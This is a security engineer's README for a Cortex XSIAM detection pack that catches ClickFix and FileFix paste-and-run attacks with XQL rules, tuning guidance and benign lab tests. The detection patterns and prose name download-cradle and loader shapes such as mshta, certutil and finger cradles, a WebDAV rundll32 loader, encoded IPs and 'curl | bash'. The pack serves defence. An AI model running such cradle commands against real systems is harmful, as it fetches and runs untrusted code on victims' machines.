# ClickFix / FileFix Behavioral Detection Pack for Cortex XSIAM (XQL)

**Detect paste-and-run social engineering on behavior alone, with no domain, IP, or hash IOCs.**

**Author:** Abdalla Elzedy, Security Engineer

ClickFix (and its file-picker variant FileFix) is a social-engineering technique in which
a web page copies a command to the victim's clipboard and instructs them to paste it into
a trusted OS surface, such as the Windows **Run** dialog, a browser address bar, Windows
Terminal, or a macOS terminal, and press Enter. The pasted command downloads and runs code.
It needs no exploit, no attachment, and no vulnerable software; it turns the user's own
keystrokes into initial code execution.

Because ClickFix rotates lure domains, redirectors, and payloads faster than any blocklist
can track, this pack does **not** detect on infrastructure. It detects on the one thing the
technique cannot change: **a graphical, interactive process becomes the parent of a command
interpreter or LOLBin, that child immediately fetches or decodes something, and (on the
Win+R path) a `RunMRU` registry value is written with the pasted string.** Rules built on
that invariant survive infrastructure rotation and fire on the next campaign on a brand-new
domain.

All queries target the **Cortex XDR agent** data model (`xdr_data`) and were validated for
syntax against Cortex XSIAM. Field names and adaptation notes are in
[Requirements](#requirements--data-model).

---

## Table of contents

- [Detection philosophy](#detection-philosophy)
- [Requirements & data model](#requirements--data-model)
- [Rule index](#rule-index)
- [Category A: High-confidence alerts](#category-a-high-confidence-alerts)
- [Category B: Registry / forensic](#category-b-registry--forensic)
- [Category C: Enrichment](#category-c-enrichment)
- [Category D: Broad hunt](#category-d-broad-hunt)
- [Category E: macOS (template)](#category-e-macos-template)
- [Variant coverage matrix](#variant-coverage-matrix)
- [False-positive tuning guide](#false-positive-tuning-guide)
- [Deploying as correlation rules](#deploying-as-correlation-rules)
- [Lab validation (safe tests)](#lab-validation-safe-tests)
- [XQL engineering notes](#xql-engineering-notes)
- [MITRE ATT&CK coverage](#mitre-attck-coverage)
- [Changelog & license](#changelog--license)

---

## Detection philosophy

Every "Fix" variant reduces to the same shape on the endpoint. Build detections on these
stages, in this order of preference:

1. **An interactive/GUI parent spawns an interpreter or LOLBin.** The Run dialog is hosted by
   `explorer.exe`, so a Win+R paste makes the interpreter a direct child of Explorer. FileFix
   pastes into a browser file picker or address bar, so the parent is the browser. The
   Windows Terminal variant makes it `wt.exe`. None of these normally spawn a shell.
2. **The child immediately fetches or decodes.** A download cradle, an encoded command, a
   WebDAV pull, or obfuscation that hides the tool names and URL (caret escaping, `where`
   wildcards, delayed expansion, numeric-encoded IPs).
3. **On the Win+R path, a `RunMRU` registry write** lands within seconds, recording the
   pasted string verbatim. It is the best offline/retro artifact, and it captures the paste
   even if execution was blocked.

Never reference a lure domain, C2 address, or file hash. That is what makes the pack durable.

---

## Requirements & data model

| Requirement | Value |
|---|---|
| Product | Palo Alto Networks Cortex XSIAM / Cortex XDR |
| Dataset | `xdr_data` (Cortex XDR agent endpoint telemetry) |
| Event types | `ENUM.PROCESS` (+ `ENUM.PROCESS_START`), `ENUM.REGISTRY`, `ENUM.NETWORK` |
| Platforms | Windows (Categories A-D). macOS template in Category E. |

**Fields used throughout:**

| Field | Meaning |
|---|---|
| `agent_hostname`, `agent_os_type` | Endpoint identity / OS (`ENUM.AGENT_OS_WINDOWS`, `ENUM.AGENT_OS_MACOS`) |
| `actor_process_image_name` | Immediate parent process image |
| `action_process_image_name` | The process that started (the child) |
| `causality_actor_process_image_name` | Root of the causality chain (useful to strip benign automation) |
| `action_process_image_command_line` | Full command line of the child |
| `action_process_username`, `action_process_integrity_level` | Who ran it, and at what integrity |
| `action_registry_key_name`, `action_registry_value_name`, `action_registry_data` | Registry write fields (RunMRU) |
| `action_external_hostname`, `action_remote_ip`, `action_remote_port` | Network destination |

**Adapting to another data model:** if you run these against Cortex XDR CIM / a normalized
schema or another EDR, map `actor_process_image_name` to the parent image,
`action_process_image_name` to the process image, `action_process_image_command_line` to the
process command line, and the registry fields to your registry-event equivalents. The logic
is portable; only the field names change.

---

## Rule index

| ID | Name | Tier | FP profile | ATT&CK |
|----|------|------|-----------|--------|
| **A1** | Interactive parent spawns interpreter with paste grammar | Alert | Low (with tuning) | T1204.002, T1059 |
| **A2** | Compatibility-assistant launcher proxy (`explorer` to `pcalua`) | Alert | Very low | T1204.002, T1218 |
| **A3** | WebDAV remote-code-execution loader | Alert | Very low | T1218.011, T1570 |
| **A4** | LOLBin download cradle from interactive parent | Alert | Low | T1105, T1218 |
| **B1** | RunMRU suspicious paste artifact | Alert / retro | Low | T1204.002, T1112 |
| **B2** | RunMRU fake-verification phrase | Hunt | Low | T1204.002 |
| **C1** | In-query deobfuscation (caret to payload URL/domain) | Enrichment | n/a | T1140 |
| **D1** | Broad interactive-parent to interpreter net | Hunt | Medium | T1204.002 |
| **E1** | macOS Terminal / Script Editor paste-run | Template | Env-dependent | T1204.002, T1059.004 |

---

## Category A: High-confidence alerts

### A1. Interactive parent spawns an interpreter with paste-and-run grammar

**Purpose.** The general detector: any interactive/GUI parent (Explorer, a browser, Windows
Terminal, the script hosts) spawning an interpreter or LOLBin whose command line carries
paste-and-run grammar. Domain-independent; covers classic ClickFix, FileFix, encoded
PowerShell, download cradles, and the Windows Terminal variant in one rule.

**Severity:** High. **ATT&CK:** T1204.002 (Malicious Copy & Paste), T1059.001/.003, T1105.

```xql
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
      and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_image_name in
        ("explorer.exe","msedge.exe","chrome.exe","firefox.exe","brave.exe",
         "wt.exe","WindowsTerminal.exe","OpenConsole.exe","wscript.exe","cscript.exe")
      and action_process_image_name in
        ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe","rundll32.exe","pcalua.exe",
         "curl.exe","bitsadmin.exe","certutil.exe","msiexec.exe","nslookup.exe",
         "regsvr32.exe","finger.exe")
| alter cmd = lowercase(action_process_image_command_line)
| filter cmd ~= "/v:on|/v/c|\^[a-z0-9]\^|frombase64string|downloadstring|invoke-webrequest|invoke-restmethod|iwr |irm |win32_process|showwindow=0|get-clipboard|start-bitstransfer"
      or (cmd contains "mshta"    and cmd contains "http")
      or (cmd contains "curl"     and cmd contains "http")
      or (cmd contains "certutil" and cmd contains "http")
      or (cmd contains "finger"   and cmd contains "@")
      or (cmd contains "pushd"    and cmd contains "rundll32")
      or (cmd contains "msiexec"  and cmd contains "http")
      or cmd contains "-encodedcommand"
// --- environment tuning: exclude known-benign launchers (see FP guide) ---
| filter not cmd contains "napari" and not cmd contains "pymol"
| comp count(1) as hits, min(_time) as first_seen, max(_time) as last_seen
       by agent_hostname, action_process_username,
          actor_process_image_name, action_process_image_name, cmd
| sort desc last_seen
```

**Why the grammar tokens matter.** `\^[a-z0-9]\^` matches any character wrapped in carets, so
it catches caret-escaping of *anything* (`m^s^h^t^a`, `h^t^t^p`), not just a URL. `/v:on` and
`/v/c` are `cmd` delayed expansion, the mechanism that lets `!var!` dereference `where` output.
`win32_process` plus `showwindow=0` catches hidden WMI process-create. `finger` plus `@`
catches the `finger.exe` download cradle. `pushd` plus `rundll32` catches the WebDAV loader
(see A3).

**Tuning.** Decode any `-EncodedCommand` and drop results that decode to benign packaged tools
(for example `winget`); encoded PowerShell launched by Explorer is a legitimate FP source for
software management. See the [FP guide](#false-positive-tuning-guide).

---

### A2. Compatibility-assistant launcher proxy (`explorer.exe` to `pcalua.exe`)

**Purpose.** `pcalua.exe` (the Program Compatibility Assistant) is normally launched only by
the PCA service. When **`explorer.exe`** launches it with an `-a`/`-c` payload, that is a Run
dialog paste using `pcalua` as a proxy to hide the real interpreter. It is a deliberate
evasion of naive "Explorer spawned PowerShell" rules, because the immediate child is `pcalua`,
not the shell. This is one of the highest-precision ClickFix signals available.

**Severity:** High. **ATT&CK:** T1204.002, T1218 (System Binary Proxy Execution).

```xql
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
      and actor_process_image_name = "explorer.exe"
      and action_process_image_name = "pcalua.exe"
| alter cmd = lowercase(action_process_image_command_line)
| comp count(1) as hits, min(_time) as first_seen, max(_time) as last_seen,
       values(action_process_username) as users
       by agent_hostname, cmd
| sort desc last_seen
```

**FP profile:** very low. `pcalua` invoked with `-a "<interpreter>" -c "<payload>"` from
`explorer.exe` has no common benign analogue. Review any hit.

---

### A3. WebDAV remote-code-execution loader

**Purpose.** The 2025-2026 WebDAV-mini-redirector variant: the pasted command runs
`pushd \\<host>@SSL\<path>` to mount a remote share over HTTPS, then `rundll32 <file>,#<ordinal>`
to execute a remotely-hosted DLL/file by ordinal. Fileless from the user's perspective.

**Important negative result:** `@ssl` **alone** and `davclnt.dll,DavSetCookie` **alone are not
usable**, because normal SharePoint / OneDrive access generates that pattern across many hosts
every day. The malicious discriminator is the `pushd`-to-WebDAV **combined with** a `rundll32`
load, which does not occur benignly.

**Severity:** High. **ATT&CK:** T1218.011 (rundll32), T1570 (Lateral Tool Transfer / WebDAV).

```xql
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| alter cmd = lowercase(action_process_image_command_line)
| filter cmd contains "pushd" and cmd contains "rundll32" and cmd contains "@ssl"
| comp count(1) as hits, min(_time) as first_seen, max(_time) as last_seen
       by agent_hostname, action_process_username, action_process_image_name, cmd
| sort desc last_seen
```

**Companion signal:** `rundll32` executing a non-`.dll` file by ordinal (for example
`payload.key,#1`), a common way to run a WebDAV-fetched loader without a `.dll` extension:

```xql
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
      and action_process_image_name = "rundll32.exe"
| alter cmd = lowercase(action_process_image_command_line)
| filter cmd contains ",#" and not cmd contains ".dll"
| comp count(1) as hits, values(agent_hostname) as hosts by cmd
| sort desc hits
```

---

### A4. LOLBin download cradle from an interactive parent

**Purpose.** ClickFix increasingly stages via a living-off-the-land binary rather than a plain
`curl | iex`, to dodge PowerShell-focused rules: `finger.exe` (abusing the finger protocol to
retrieve remote data), `bitsadmin`, `certutil -urlcache`, `mshta` to a remote page, `nslookup`
TXT-record cradles, and numeric/hex-encoded IPs to hide the destination. This rule isolates
those when launched from an interactive parent.

**Severity:** High. **ATT&CK:** T1105 (Ingress Tool Transfer), T1218, T1071.004 (DNS).

```xql
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
      and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_image_name in
        ("explorer.exe","msedge.exe","chrome.exe","firefox.exe","brave.exe",
         "wt.exe","WindowsTerminal.exe","cmd.exe","pcalua.exe")
| alter cmd = lowercase(action_process_image_command_line)
| filter (action_process_image_name = "finger.exe"   and cmd contains "@")
      or (action_process_image_name = "bitsadmin.exe" and cmd contains "http")
      or (action_process_image_name = "certutil.exe"  and (cmd contains "urlcache" or cmd contains "http"))
      or (action_process_image_name = "mshta.exe"     and cmd contains "http")
      or (action_process_image_name = "nslookup.exe"  and cmd contains "-q")
      or cmd ~= "iwr\s+\d{8,10}\b"        // decimal-encoded IPv4 download cradle
      or cmd ~= "iwr\s+0x[0-9a-f]+"        // hex-encoded IPv4 download cradle
| comp count(1) as hits, min(_time) as first_seen, max(_time) as last_seen
       by agent_hostname, action_process_username, action_process_image_name, cmd
| sort desc last_seen
```

**Note on numeric IPs.** A large bare integer as a URL host (for example `iwr 3232235777/x`) is
an integer-encoded IPv4 address (`3232235777` equals `192.168.1.1`), a classic obfuscation that
hides the destination from a human and from naive URL matching. Decode with
`(n>>24)&255 . (n>>16)&255 . (n>>8)&255 . n&255`.

---

## Category B: Registry / forensic

### B1. RunMRU suspicious paste artifact

**Purpose.** A Win+R paste is written verbatim to
`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` as a single-letter value
(`a`, `b`, and so on) with a trailing `\1`. This is the best **offline / retrospective**
artifact: it captures the paste even if execution was blocked, and it survives process-event
rollover.

**Severity:** High. **ATT&CK:** T1204.002, T1112 (Modify Registry, as an artifact).

```xql
dataset = xdr_data
| filter event_type = ENUM.REGISTRY
      and lowercase(action_registry_key_name) contains "runmru"
      and action_registry_value_name != "MRUList"
      and action_registry_data != null
| alter data = lowercase(action_registry_data)
| filter data ~= "\^|https?:|mshta|\biex\b|\biwr\b|\birm\b|invoke-|frombase64|-enc|downloadstring|bitsadmin|certutil|get-clipboard|pcalua|saps |start-process|win32_process|@ssl|curl |finger "
| comp count(1) as hits, values(agent_hostname) as hosts,
       min(_time) as first_seen, max(_time) as last_seen by data
| sort desc last_seen
```

**Baseline exclusion.** Drop bare-name entries with no arguments (`cmd\1`, `powershell\1`,
`mspaint\1`) and legitimate UNC / MMC entries (`\\server\share\1`, `mstsc\1`, `services.msc\1`).
The grammar filter above already excludes these because they carry none of the tokens.

---

### B2. RunMRU fake-verification phrase

**Purpose.** Fake-CAPTCHA kits pad the malicious command with a benign-looking "verification"
comment (`# I am not a robot`, `reCAPTCHA Verification ID`, a Cloudflare `Ray ID`, a checkmark
emoji) so the Run box reads as a verification token. This is a forward-looking variant catcher;
require a phrase keyword, because a bare `#` alone is noisy (it matches `rundll32 …,#1`
ordinals).

**Severity:** Medium (hunt). **ATT&CK:** T1204.002.

```xql
dataset = xdr_data
| filter event_type = ENUM.REGISTRY
      and lowercase(action_registry_key_name) contains "runmru"
      and action_registry_data != null
| alter data = lowercase(action_registry_data)
| filter data ~= "captcha|recaptcha|turnstile|ray.?id|not a robot|verification (id|hash|uid)|verify you are human|cloud identificator|i am (a )?human"
      or data contains "✅" or data contains "✔"
| comp count(1) as hits, values(agent_hostname) as hosts by data
| sort desc hits
```

---

## Category C: Enrichment

### C1. In-query deobfuscation (caret to payload URL / domain)

**Purpose.** Run on any A1/A2/B1 hit whose command is caret-escaped. Strips the carets and
lifts the real URL and registered domain in one pass, so the analyst gets the actionable
indicator to blocklist without decoding by hand.

**ATT&CK:** T1140 (Deobfuscate / Decode Files or Information).

```xql
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
      and actor_process_image_name in ("explorer.exe","pcalua.exe","cmd.exe","powershell.exe")
| alter cmd = lowercase(action_process_image_command_line)
| filter cmd ~= "\^[a-z0-9]\^"
| alter deob           = replex(cmd, "\^", "")
| alter payload_url    = arrayindex(regextract(deob, "https?://[a-z0-9._\-]+/[a-z0-9._\-]*"), 0)
| alter payload_domain = extract_url_registered_domain(payload_url)
| fields _time, agent_hostname, action_process_username, payload_url, payload_domain,
         action_process_image_command_line
| sort desc _time
```

Example: `m^s^h^t^a h^t^t^p^s^:^/^/verify-human[.]example/o` resolves to
`payload_url = https://verify-human.example/o` and `payload_domain = verify-human.example`.
(Example domain is synthetic and defanged.)

---

## Category D: Broad hunt

### D1. Broad interactive-parent to interpreter net

**Purpose.** The unrefined form of A1 for periodic threat hunting: any interactive parent
spawning an interpreter, with the tuning removed. Higher recall, more benign clusters, so
**review, do not auto-alert.** Use it to discover the benign baseline you will exclude in A1,
and to catch novel variants A1's grammar list does not yet cover.

**Severity:** Informational (hunt). **ATT&CK:** T1204.002.

```xql
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
      and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_image_name in
        ("explorer.exe","msedge.exe","chrome.exe","firefox.exe","brave.exe",
         "wt.exe","WindowsTerminal.exe","OpenConsole.exe","wscript.exe","cscript.exe")
      and action_process_image_name in
        ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe","rundll32.exe","pcalua.exe",
         "curl.exe","bitsadmin.exe","certutil.exe","msiexec.exe","nslookup.exe",
         "regsvr32.exe","finger.exe")
| alter cmd = lowercase(action_process_image_command_line)
| comp count(1) as hits, values(action_process_username) as users,
       min(_time) as first_seen, max(_time) as last_seen
       by agent_hostname, actor_process_image_name, action_process_image_name
| sort desc hits
```

---

## Category E: macOS (template)

### E1. Terminal / Script Editor paste-run

**Purpose.** The macOS analogue: `Terminal`, `iTerm`, or `Script Editor` spawning
`curl | bash`, `base64 -d | sh`, or `dscl . -authonly` (a password-verification pattern used
by macOS ClickFix loaders). **Validate before deploying**, because developer tooling (IDEs,
package managers) spawns shells the same way and must be excluded first.

**Severity:** High (once tuned). **ATT&CK:** T1204.002, T1059.004 (Unix Shell).

```xql
dataset = xdr_data
| filter agent_os_type = ENUM.AGENT_OS_MACOS
      and event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| alter parent = lowercase(actor_process_image_name),
        cmd    = lowercase(action_process_image_command_line)
| filter parent contains "terminal" or parent contains "iterm" or parent contains "script editor"
| filter cmd contains "curl " or cmd contains "| bash" or cmd contains "| zsh"
      or cmd contains "| sh" or cmd contains "base64 -d" or cmd contains "dscl "
// exclude your developer tooling before alerting, for example:
// | filter not parent contains "code" and not cmd contains "homebrew"
| fields _time, agent_hostname, action_process_username, parent,
         action_process_image_name, action_process_image_command_line
| sort desc _time
```

---

## Variant coverage matrix

| ClickFix / FileFix variant | Parent lineage | Rule(s) |
|----------------------------|----------------|---------|
| Classic Win+R to mshta / powershell / cmd | `explorer` to interpreter | A1, B1 |
| Run-dialog compatibility-assistant proxy | `explorer` to `pcalua` to interpreter | **A2**, A1, B1 |
| Caret-escaped command / URL | any | A1, B1, **C1** (decodes IOC) |
| WebDAV `rundll32 \\host@SSL,#ordinal` loader | `explorer` to cmd/rundll32 | **A3**, A1 |
| `finger.exe` download cradle | `explorer` to `finger` | A4, A1, B1 |
| Numeric / hex-encoded IP cradle | `explorer` to `powershell` | A4, A1 |
| Encoded PowerShell (`-enc`) | `explorer` / browser to `powershell` | A1 (decode to cut FP) |
| `Get-Clipboard | iex` staged stub | `explorer` to `powershell` | A1 |
| FileFix (browser file picker / address bar) | browser to cmd/powershell | A1 (browser parents) |
| Windows Terminal (Win+X) variant | `wt.exe` to `powershell` | A1 (wt.exe) |
| DNS / `nslookup` TXT cradle | `explorer` to `nslookup` | A4, A1 |
| `search-ms:` / `msiexec` remote install | `explorer` to `msiexec` | A1 |
| Fake-CAPTCHA `#` comment padding | `explorer` to interpreter | B2, B1 |
| macOS Terminal / Script Editor paste | Terminal / Script Editor to curl/bash | E1 |

---

## False-positive tuning guide

Precision comes from knowing the benign baseline in **your** environment. Run D1 first,
identify the recurring benign clusters, and exclude them in A1. The most common sources:

| Source | Looks like | Exclusion |
|--------|-----------|-----------|
| Scientific-Python app launchers (for example napari, PyMOL) | `cmd start /min powershell -windowstyle hidden "start '…\menu\…bat'"` | exclude on the app name / `\menu\` |
| Local installer / printer HTA tools | `mshta "C:\…\tool.hta" {GUID}` | require `mshta` **with** `http` (already in A1) |
| Packaged software uninstall (winget / MDM) | `powershell -EncodedCommand <b64>` decoding to `winget uninstall …` | decode `-EncodedCommand`, drop if it decodes to `winget` |
| SharePoint / OneDrive WebDAV access | `rundll32 davclnt.dll,DavSetCookie …sharepoint.com@ssl` | require `pushd` **plus** `rundll32` (A3 does this); never key on `@ssl` alone |
| Bare port-number substrings | `service-agent@8058`, instance IDs matching `@80`/`@443` | never match `@80` / `@443` as bare substrings; use `@ssl` only, and only with A3's combo |
| RMM / automation running hidden PowerShell | `powershell -windowstyle hidden …` | scope to interactive parents (A1 does this); exclude known RMM by `causality_actor_process_image_name` |
| macOS developer tooling | IDEs / package managers spawning `zsh -c …` | exclude those parents/commands in E1 |

**General rule:** many ClickFix payloads *deliver* RMM and packaged software, so do not
blanket-allow those tools. Allow the *specific benign parent/causality chain*, not the child
binary.

---

## Deploying as correlation rules

A1-A4 and B1 are cheap **per event**, so run them as real-time Correlation Rules rather than
scheduled scans (this also removes the performance cost of fleet-wide historical scans):

1. Cortex XSIAM, then **Detection Rules, Correlation Rules, New**.
2. Paste the rule body up to the `| comp …` line (a correlation rule matches per event; drop
   the aggregation and sort).
3. Time window: real-time. Generate one alert per match.
4. Map to the ATT&CK techniques in the [rule index](#rule-index); set severity **High** for
   A1-A4/B1.
5. Alert fields: `agent_hostname`, `action_process_username`, `action_process_integrity_level`,
   `action_process_image_command_line`. Attach C1 as an enrichment to emit `payload_domain`.

Keep **B2, D1** as scheduled hunts, and **E1** as a hunt until validated in your environment.
Every A1-A4/B1 hit is a user who completed the paste, so treat the host as having run untrusted
code and begin containment/triage.

---

## Lab validation (safe tests)

Validate the rules in an isolated lab with **benign** commands that exercise the detection
logic without doing anything harmful. Type these into the **Run** dialog (Win+R) on a test
host with a Cortex agent, then confirm the rule fires.

| Rule | Safe test (benign) | What it proves |
|------|--------------------|----------------|
| A1 (caret) | `cmd /v:on /c echo t^e^s^t` | caret token plus `/v:on` match; `explorer` to `cmd` |
| A2 (pcalua proxy) | `pcalua.exe -a "powershell.exe" -c "echo clickfix-test"` | `explorer` to `pcalua`, the highest-precision signal |
| A4 (finger shape) | `finger testuser@localhost` | `explorer` to `finger` with `@` (connects nowhere useful) |
| B1 (RunMRU) | any of the above | the paste is written to `RunMRU` verbatim with `\1` |
| C1 (deob) | `cmd /c echo h^t^t^p^s^:^/^/example[.]test/o` | strips carets, extracts `example.test` |

For end-to-end coverage against realistic (but controlled) execution chains, use the public
**Atomic Red Team** tests for **T1204.002** in an isolated VM. Do not run live ClickFix
commands from an untrusted page.

---

## XQL engineering notes

Practical caveats learned building and validating this pack on Cortex XSIAM. They save hours
and prevent silent `HTTP 500` query failures:

- **`values(substr(...))` and other value-of-derived aggregations can return `HTTP 500`.**
  Aggregate raw fields, or `fields` the (small) filtered set. `values(<plain field>)` is fine.
- **Avoid a trailing/embedded backslash inside a long `contains` filter.** `cmd contains "@ssl\"`
  (trailing escaped backslash) and stacked `not cmd contains "\path\"` clauses have been
  observed to `500`. Match tokens **without** the trailing backslash (`@ssl`), and exclude on a
  plain substring (an app name) rather than a backslash-delimited path.
- **Bare `@80` / `@443` are useless as tokens**, because they match unrelated text such as
  `service-agent@8058`. `@ssl` is the only meaningful WebDAV-over-HTTPS token, and only in the
  `pushd` plus `rundll32` combination (A3).
- **Prefer a flat caret regex `\^[a-z0-9]\^` over a grouped, quantified one** like
  `(\^[a-z0-9\-\.:/]){4,}`; the grouped form is more fragile in the `~=` engine and the flat
  form matches the same obfuscation.
- **These work reliably:** `~=` regex match, `replex(s, pat, repl)`, `regextract` plus
  `arrayindex`, `extract_url_registered_domain`, conditional `comp`, `if()` ladders.
- **Set the time window with the API/UI timeframe, not an in-query `config` statement.** A
  leading `config timeframe …` / `config case_sensitive …` can `500` through some query paths.
- **macOS process queries may fail at the API layer on some tenants** while the Windows
  equivalents run normally, so validate E1 before relying on it.
- **The network border is not a substitute for these rules.** ClickFix executions frequently
  occur while a host is off the corporate network, so the C2 traffic never crosses a perimeter
  sensor. Endpoint process/registry telemetry is the authoritative sensor for this technique.

---

## MITRE ATT&CK coverage

| Tactic | Technique | Rules |
|--------|-----------|-------|
| Initial Access / Execution | **T1204.002** User Execution: Malicious Copy and Paste | A1, A2, A4, B1, B2, D1, E1 |
| Execution | **T1059.001** PowerShell / **.003** Windows Command Shell / **.004** Unix Shell | A1, D1, E1 |
| Defense Evasion | **T1218** System Binary Proxy Execution / **.011** Rundll32 | A2, A3, A4 |
| Defense Evasion | **T1140** Deobfuscate/Decode Information | C1 |
| Command & Control / Ingress | **T1105** Ingress Tool Transfer | A4 |
| Command & Control | **T1071.004** Application Layer Protocol: DNS | A4 (nslookup cradle) |
| Lateral Movement / C2 | **T1570** Lateral Tool Transfer (WebDAV) | A3 |

---

## Changelog & license

**v1.0** by Abdalla Elzedy, Security Engineer. Initial release: Categories A-E, coverage
matrix, FP guide, correlation-rule deployment, lab validation, and XQL engineering notes.


